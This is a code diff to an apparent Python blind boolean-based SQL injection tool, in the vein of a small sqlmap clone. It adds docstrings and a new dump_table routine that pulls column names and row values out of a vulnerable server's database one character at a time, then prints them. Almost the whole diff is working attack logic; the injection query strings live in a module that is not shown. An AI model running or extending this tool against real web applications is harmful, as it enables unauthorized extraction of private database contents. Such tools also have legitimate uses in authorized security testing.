@@ -2,7 +2,6 @@ from HandleRequests import *
 from STRINGS import *
 import math
 
-
 async def check_if_boolean_based_is_possible(request, parameter, comment, session):
     """
     check if blind boolean based sqli is possible by sending an always true parameter, an always false parameter and
@@ -25,13 +24,13 @@ async def check_if_boolean_based_is_possible(request, parameter, comment, sessio
 
 async def ask_sql_with_boolean(request, parameter, query, session, true_and_false_responses):
     """
-
-    :param request:
-    :param parameter:
-    :param query:
-    :param session:
-    :param true_and_false_responses:
-    :return:
+    sends a sql query and detects whether it was true or false
+    :param request: the request we want to modify
+    :param parameter: the vulnerable parameter
+    :param query: the query we want to check
+    :param session: the aiohttp session
+    :param true_and_false_responses: an example for a true response and a false response
+    :return: True of the sql query returned True, false otherwise
     """
     response = await send_sql_request(request, parameter, query, session)
     response_text = await response.text()
@@ -49,6 +48,7 @@ async def find_number(request, parameter, true_and_false_responses, query, limit
     :param true_and_false_responses: an example for a response when using an always true sql query, and an alqays false one.
     :param query: the query we want to send to the sql server. should check something about a number, and use our index in every iteration
     :param limit: a high bound for the for loop
+    :param session: the aiohttp session
     :return: the number requested
     """
     for i in range(limit):
@@ -60,13 +60,13 @@ async def find_number(request, parameter, true_and_false_responses, query, limit
 
 async def find_letter_in_string(request, parameter, true_and_false_responses, query, session):
     """
-
-    :param request:
-    :param parameters:
-    :param true_and_false_responses:
-    :param query:
-    :param session
-    :return:
+    finds the nth letter in a word from the sql server.
+    :param request: the HTTPRequest object we will modify
+    :param parameters: the exploitable parameter
+    :param true_and_false_responses: an example for a response when using an always true sql query, and an alqays false one.
+    :param query: the query we want to send to the sql server. should check about a character in a word.
+    :param session: the aiohttp session
+    :return: the letter
     """
     lower_bound = ASCII_LOWER_BOUND
     upper_bound = ASCII_UPPER_BOUND
@@ -98,12 +98,14 @@ async def find_letter_in_string(request, parameter, true_and_false_responses, qu
 
 async def find_word(request, parameter, query, true_and_false_responses, session, word_length):
     """
-
-    :param request:
-    :param parameter:
-    :param comment:
-    :param true_and_false_responses:
-    :return:
+    finds a word from the sql server
+    :param request: the HTTPRequest object we will modify
+    :param parameters: the exploitable parameter
+    :param true_and_false_responses: an example for a response when using an always true sql query, and an alqays false one.
+    :param query: the query we want to send to the sql server. should check about a character in a word.
+    :param session: the aiohttp session
+    :param word_length: the length of the word we are looking for
+    :return: the word
     """
     tasks = []
     for i in range(1, word_length + 1):
@@ -117,12 +119,13 @@ async def find_word(request, parameter, query, true_and_false_responses, session
 
 async def find_db_names(request, parameter, comment, true_and_false_responses, session):
     """
-
-    :param request:
-    :param parameter:
-    :param comment:
-    :param true_and_false_responses:
-    :return:
+    finds all the names of the dbs on the server
+    :param request: the HTTPRequest object we will modify
+    :param parameters: the exploitable parameter
+    :param comment: The comment char recognized by the program
+    :param true_and_false_responses: an example for a response when using an always true sql query, and an alqays false one.
+    :param session: the aiohttp session
+    :return: a list with all the dbs names
     """
     num_of_dbs = await find_number(request, parameter, true_and_false_responses,
                                    BLIND_BOOLEAN_COUNT_DBS % (STRING_PLACEHOLDER, comment), MAX_NUM_OF_DBS_TO_CHECK,
@@ -143,14 +146,14 @@ async def find_db_names(request, parameter, comment, true_and_false_responses, s
 
 async def find_table_names(request, parameter, comment, true_and_false_responses, session, db_name):
     """
-
-    :param request:
-    :param parameter:
-    :param comment:
-    :param true_and_false_responses:
-    :param session:
-    :param db_name:
-    :return:
+    returns the tables names in db_name db
+    :param request: the HTTPRequest object we will modify
+    :param parameters: the exploitable parameter
+    :param comment: The comment char recognized by the program
+    :param true_and_false_responses: an example for a response when using an always true sql query, and an alqays false one.
+    :param session: the aiohttp session
+    :param db_name: the name of the db we want to get the from
+    :return: a list with all the tables names
     """
     # first, we will check that the db really exists
     does_db_exist = await ask_sql_with_boolean(request, parameter, BLIND_BOOLEAN_DB_NAME_EXISTS % (db_name, comment),
@@ -167,9 +170,8 @@ async def find_table_names(request, parameter, comment, true_and_false_responses
     for i in range(num_of_tables):
         length_of_word = await find_number(request, parameter, true_and_false_responses,
                                            BLIND_BOOLEAN_TABLE_NAME_LENGTH % (db_name, i, STRING_PLACEHOLDER, comment),
-                                           MAX_LEN_OF_STRING,
-                                           session)
-        table_name = await find_word(request, parameter, BLIND_BOOLEAN_DB_NAME_CHAR % (
+                                           MAX_LEN_OF_STRING, session)
+        table_name = await find_word(request, parameter, BLIND_BOOLEAN_TABLE_NAME_CHAR % (
             STRING_PLACEHOLDER, db_name, i, STRING_PLACEHOLDER, STRING_PLACEHOLDER, comment),
                                      true_and_false_responses, session,
                                      length_of_word)  # The query should be a single letter find query with an index placeholder
@@ -177,13 +179,81 @@ async def find_table_names(request, parameter, comment, true_and_false_responses
     return table_names
 
 
+async def dump_table(request, parameter, comment, true_and_false_responses, session, db_name, table_name):
+    """
+    dumps the data from a specified table
+    :param request: the HTTPRequest object we will modify
+    :param parameters: the exploitable parameter
+    :param comment: The comment char recognized by the program
+    :param true_and_false_responses: an example for a response when using an always true sql query, and an alqays false one.
+    :param session: the aiohttp session
+    :param db_name: the name of the db we want to get the from
+    :param table_name: the table we want to dump
+    :return: a dictionary representing the table's data
+    """
+    # check if table exists
+    does_table_exist = await ask_sql_with_boolean(request, parameter,
+                                                  BLIND_BOOLEAN_TABLE_NAME_EXISTS % (table_name, db_name, comment),
+                                                  session, true_and_false_responses)
+    if not does_table_exist:
+        print(DB_NOT_FOUND)
+        exit(0)
+    # get table number of columns
+    num_of_columns = await find_number(request, parameter, true_and_false_responses,
+                                       BLIND_BOOLEAN_COUNT_COLUMNS % (db_name, table_name, STRING_PLACEHOLDER, comment),
+                                       MAX_NUM_OF_TABLES_TO_CHECK, session)
+    # get table columns names
+    columns_names = []
+    for i in range(num_of_columns):
+        length_of_word = await find_number(request, parameter, true_and_false_responses,
+                                           BLIND_BOOLEAN_COLUMN_NAME_LENGTH % (
+                                           db_name, table_name, i, STRING_PLACEHOLDER, comment),
+                                           MAX_LEN_OF_STRING, session)
+        column_name = await find_word(request, parameter, BLIND_BOOLEAN_COLUMN_NAME_CHAR % (
+            STRING_PLACEHOLDER, db_name, table_name, i, STRING_PLACEHOLDER, STRING_PLACEHOLDER, comment),
+                                      true_and_false_responses, session,
+                                      length_of_word)  # The query should be a single letter find query with an index placeholder
+        columns_names.append(column_name)
+    table_data = {}
+    for name in columns_names:
+        table_data[name] = []
+    num_of_rows = await find_number(request, parameter, true_and_false_responses,
+                                    BLIND_BOOLEAN_COUNT_ROWS % (db_name, table_name, STRING_PLACEHOLDER, comment),
+                                    MAX_NUM_OF_TABLES_TO_CHECK, session)
+    column_order_by = columns_names[0]
+    for i in range(num_of_rows):
+        for column_name in columns_names:
+            length_of_word = await find_number(request, parameter, true_and_false_responses,
+                                               BLIND_BOOLEAN_ELEMENT_LENGTH % (column_name, db_name, table_name, column_order_by, i, STRING_PLACEHOLDER, comment),
+                                               MAX_LEN_OF_STRING, session)
+            if length_of_word == NOT_DETECTED:
+                table_data[column_name].append("")
+                continue
+            string = await find_word(request, parameter, BLIND_BOOLEAN_ELEMENT_CHAR % (column_name,
+                STRING_PLACEHOLDER, db_name, table_name, column_order_by, i, STRING_PLACEHOLDER, STRING_PLACEHOLDER,
+                                          comment),true_and_false_responses, session, length_of_word)
+                                          # The query should be a single letter find query with an index placeholder
+            table_data[column_name].append(string)
+    return table_data
+
+def print_table(table):
+    """
+    prints the dictionary containing the data as a table
+    :param table: the dictionary containing the data
+    """
+    print((FORMAT_TABLE_DICT* len(table.keys())).format(*table.keys()))
+    for i in range(len(table[list(table.keys())[0]])):
+        print((FORMAT_TABLE_DICT * len(table.keys())).format(*[table[key][i] for key in table.keys()]))
+
 async def boolean_based_injection(request, parameter, comment, session, flags):
     """
     manages the boolean-based injection attempts
     :param request: the request we will modify
     :param parameter: the vulnerable parameter
     :param comment: the comment char
-    :return: true if the injection worked
+    :param session: the aiohttp session
+    :param flags: the flags the user used
+    :return: prints the results
     """
     true_and_false_responses = await check_if_boolean_based_is_possible(request, parameter, comment, session)
     if true_and_false_responses != NOT_DETECTED:  # boolean is possible!
@@ -196,4 +266,11 @@ async def boolean_based_injection(request, parameter, comment, session, flags):
                                                  flags.get_db_name())
             print(table_names)
         elif action == DUMP_TABLE:
-            a = 1
+            table = await dump_table(request, parameter, comment, true_and_false_responses, session,
+                                     flags.get_db_name(), flags.get_table_name())
+            print_table(table)
+
+
+
+
+
